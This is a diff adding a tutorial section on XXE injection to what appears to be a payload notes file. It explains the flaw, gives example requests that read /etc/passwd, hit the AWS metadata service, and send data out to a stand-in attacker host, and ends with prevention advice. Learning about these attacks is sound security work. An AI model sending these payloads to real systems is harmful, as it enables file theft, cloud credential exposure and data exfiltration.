@@ -1,3 +1,95 @@
+# Description
+**XML External Entity (XXE) Injection** is a vulnerability that occurs when an application processes user-supplied XML input in an insecure manner. This allows an attacker to include an external entity reference in the XML data, which can be used to read local files, perform server-side request forgery (SSRF), or even execute arbitrary code in certain cases.
+
+### How Does XXE Injection Occur?
+
+XXE injection happens when the following conditions are met:
+1. **The application parses XML data provided by the user**: If an application accepts XML data as input, it may be vulnerable if not properly configured.
+2. **External entities are not disabled in the XML parser**: By default, some XML parsers allow the use of external entities, which can be exploited by attackers.
+3. **User-controlled XML input**: When the XML input can be manipulated by the attacker, they can define external entities to access files, make network requests, or cause other unintended actions.
+
+### Where to Put an XXE Injection Payload?
+
+An XXE payload is placed within the XML data that the web application processes. This could be in:
+1. The body of an HTTP request if the content is XML.
+2. User-supplied data that is incorporated into an XML request or response.
+3. XML-based protocols like SOAP or REST that use XML data structures.
+
+### Examples of HTTP Requests with XXE Injection
+
+#### 1. Basic XXE Injection to Read Local Files
+
+In this example, the XML input contains a defined external entity that points to a local file (`/etc/passwd`). The payload is then used to display the contents of that file.
+
+**Example HTTP Request:**
+```http
+POST /parse-xml HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/xml
+Content-Length: 204
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ 
+  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<request>
+  <name>&xxe;</name>
+</request>
+```
+In this example, the `<!DOCTYPE>` declaration is used to define an external entity named `xxe`, which references the local file `/etc/passwd`. When the XML is processed, the entity `&xxe;` is replaced with the file's contents, potentially exposing sensitive data.
+
+#### 2. XXE to Perform Server-Side Request Forgery (SSRF)
+
+An XXE payload can be used to force the server to make HTTP requests to internal services.
+
+**Example HTTP Request:**
+```http
+POST /parse-xml HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/xml
+Content-Length: 210
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ 
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> 
+]>
+<request>
+  <name>&xxe;</name>
+</request>
+```
+Here, the external entity `xxe` points to `http://169.254.169.254/latest/meta-data/`, which is the AWS EC2 metadata service. If processed, the server would attempt to fetch data from this service, potentially leaking internal information.
+
+#### 3. Out-of-Band (OOB) XXE Attack
+
+OOB XXE uses an external entity that makes an HTTP or DNS request to a server controlled by the attacker. This can be used to exfiltrate data or confirm the vulnerability.
+
+**Example HTTP Request:**
+```http
+POST /parse-xml HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/xml
+Content-Length: 210
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ 
+  <!ENTITY xxe SYSTEM "http://attacker-server.com/xxe?data=leak"> 
+]>
+<request>
+  <name>&xxe;</name>
+</request>
+```
+In this case, the entity `xxe` would cause the server to make a request to `http://attacker-server.com/xxe?data=leak`, confirming the vulnerability and possibly leaking some data.
+
+### Preventing XXE Injection
+
+To prevent XXE vulnerabilities:
+- **Disable external entity processing** in XML parsers.
+- **Use safer XML parsers** or libraries that do not support external entities by default.
+- **Validate and sanitize** XML input before processing.
+- **Avoid using XML altogether** if possible, or limit XML functionality.
+
+XXE Injection is a serious vulnerability that can lead to data theft, system compromise, or other security issues, making secure XML parsing crucial for any web application.
+
 # Contents
 * [Hidden attack surface](#Hidden-XXE-attack-surface-via-exploiting-XInclude-to-retrieve-files)
 # XXE Payloads
